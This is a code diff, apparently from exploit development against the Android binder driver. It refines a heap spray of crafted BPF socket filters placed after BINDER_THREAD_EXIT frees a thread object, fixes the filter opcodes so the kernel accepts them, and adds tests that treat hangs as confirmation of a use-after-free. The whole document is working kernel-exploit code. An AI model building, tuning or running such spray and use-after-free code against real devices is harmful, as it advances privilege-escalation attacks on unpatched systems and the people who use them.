@@ -109,19 +109,25 @@ static int do_transaction(int bfd) {
     return ioctl(bfd, BINDER_WRITE_READ, &bwr);
 }
 
-/* Create BPF filter with specific lock value at offset 0x2C */
-static void make_lock_bpf(struct sock_filter *insns, uint16_t lock_code,
-                           uint8_t lock_jt, uint8_t lock_jf) {
-    /* All instructions valid BPF_LD_IMM (code=0) with k=0 */
-    for (int i = 0; i < BPF_INSNS - 1; i++)
-        insns[i] = (struct sock_filter){ 0x0000, 0, 0, 0x00000000 };
+/* Create BPF filter with non-zero lock value at offset 0x2C.
+ * CRITICAL: Must use VALID BPF opcodes or setsockopt silently rejects!
+ * BPF_ALU_ADD_K (0x04) = "A += K" — valid NOP when K=0.
+ * For target insn: code=0x04 gives spin_lock owner=0x0004, next=0x0000 → SPIN.
+ */
+#define BPF_ALU_ADD_K 0x04  /* BPF_ALU | BPF_ADD | BPF_K */
 
-    /* Set insn[3] to have non-zero code → spin_lock at offset 0x2C reads non-zero */
-    insns[WAIT_LOCK_BPF_INSN].code = lock_code;
-    insns[WAIT_LOCK_BPF_INSN].jt = lock_jt;
-    insns[WAIT_LOCK_BPF_INSN].jf = lock_jf;
-
-    /* Last insn = BPF_RET */
+static void make_lock_bpf(struct sock_filter *insns, int all_nonzero) {
+    if (all_nonzero) {
+        /* ALL insns have code=0x04 (non-zero) — catches any offset */
+        for (int i = 0; i < BPF_INSNS - 1; i++)
+            insns[i] = (struct sock_filter){ BPF_ALU_ADD_K, 0, 0, 0x01010101 };
+    } else {
+        /* Zero everywhere except target insn[3] at offset 0x2C */
+        for (int i = 0; i < BPF_INSNS - 1; i++)
+            insns[i] = (struct sock_filter){ 0x0000, 0, 0, 0x00000000 };
+        insns[WAIT_LOCK_BPF_INSN] = (struct sock_filter){ BPF_ALU_ADD_K, 0, 0, 0x01010101 };
+    }
+    /* Last insn = BPF_RET (required by verifier) */
     insns[BPF_INSNS - 1] = (struct sock_filter){ BPF_RET | BPF_K, 0, 0, 0xFFFF };
 }
 
@@ -158,10 +164,18 @@ static void test_hang_with_txn(void) {
             int32_t dummy = 0;
             ioctl(bfd, BINDER_THREAD_EXIT, &dummy);
 
-            /* Spray with NON-ZERO lock value at offset 0x2C */
+            /* Spray with ALL non-zero BPF (code=0x04 at every insn) */
             struct sock_filter insns[BPF_INSNS];
-            make_lock_bpf(insns, 0xFFFF, 0xFF, 0xFF); /* lock = 0xFFFFFFFF */
+            make_lock_bpf(insns, 1); /* all_nonzero=1 */
             struct sock_fprog prog = { .len = BPF_INSNS, .filter = insns };
+
+            /* Verify BPF attaches (critical — invalid BPF silently fails!) */
+            int test_s = socket(AF_INET, SOCK_DGRAM, 0);
+            if (test_s >= 0) {
+                int rc = setsockopt(test_s, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
+                if (rc < 0) { close(test_s); _exit(98); /* BPF rejected */ }
+                close(test_s);
+            }
 
             int socks[NUM_SPRAY];
             for (int i = 0; i < NUM_SPRAY; i++) {
@@ -230,7 +244,7 @@ static void test_hang_without_txn(void) {
             ioctl(bfd, BINDER_THREAD_EXIT, &dummy);
 
             struct sock_filter insns[BPF_INSNS];
-            make_lock_bpf(insns, 0xFFFF, 0xFF, 0xFF);
+            make_lock_bpf(insns, 1); /* all_nonzero=1 */
             struct sock_fprog prog = { .len = BPF_INSNS, .filter = insns };
             int socks[NUM_SPRAY];
             for (int i = 0; i < NUM_SPRAY; i++) {
@@ -294,7 +308,7 @@ static void test_hang_with_reply(void) {
             ioctl(bfd, BINDER_THREAD_EXIT, &dummy);
 
             struct sock_filter insns[BPF_INSNS];
-            make_lock_bpf(insns, 0xFFFF, 0xFF, 0xFF);
+            make_lock_bpf(insns, 1); /* all_nonzero=1 */
             struct sock_fprog prog = { .len = BPF_INSNS, .filter = insns };
             int socks[NUM_SPRAY];
             for (int i = 0; i < NUM_SPRAY; i++) {
@@ -354,7 +368,7 @@ static void test_offset_sweep(void) {
             for (int i = 0; i < BPF_INSNS - 1; i++)
                 insns[i] = (struct sock_filter){ 0, 0, 0, 0 };
             /* Set ONE instruction non-zero at the target index */
-            insns[insn_idx] = (struct sock_filter){ 0xFFFF, 0xFF, 0xFF, 0xFFFFFFFF };
+            insns[insn_idx] = (struct sock_filter){ BPF_ALU_ADD_K, 0, 0, 0x01010101 };
             insns[BPF_INSNS - 1] = (struct sock_filter){ BPF_RET | BPF_K, 0, 0, 0xFFFF };
 
             struct sock_fprog prog = { .len = BPF_INSNS, .filter = insns };
@@ -393,6 +407,23 @@ int main(void) {
     printf("PID=%d UID=%d\n\n", getpid(), getuid());
 
     alarm(600);
+
+    /* Validate BPF spray works before running tests */
+    {
+        struct sock_filter test_insns[BPF_INSNS];
+        make_lock_bpf(test_insns, 1);
+        struct sock_fprog test_prog = { .len = BPF_INSNS, .filter = test_insns };
+        int ts = socket(AF_INET, SOCK_DGRAM, 0);
+        if (ts >= 0) {
+            int rc = setsockopt(ts, SOL_SOCKET, SO_ATTACH_FILTER, &test_prog, sizeof(test_prog));
+            printf("BPF spray validation: setsockopt=%d errno=%d\n", rc, rc < 0 ? errno : 0);
+            if (rc < 0) { printf("FATAL: BPF rejected! Cannot spray.\n"); return 1; }
+            close(ts);
+        } else {
+            printf("FATAL: socket() failed\n"); return 1;
+        }
+        printf("\n");
+    }
 
     test_hang_without_txn();  /* Baseline: should be 0 hangs */
     test_hang_with_txn();     /* Main test: hangs = UAF confirmed */
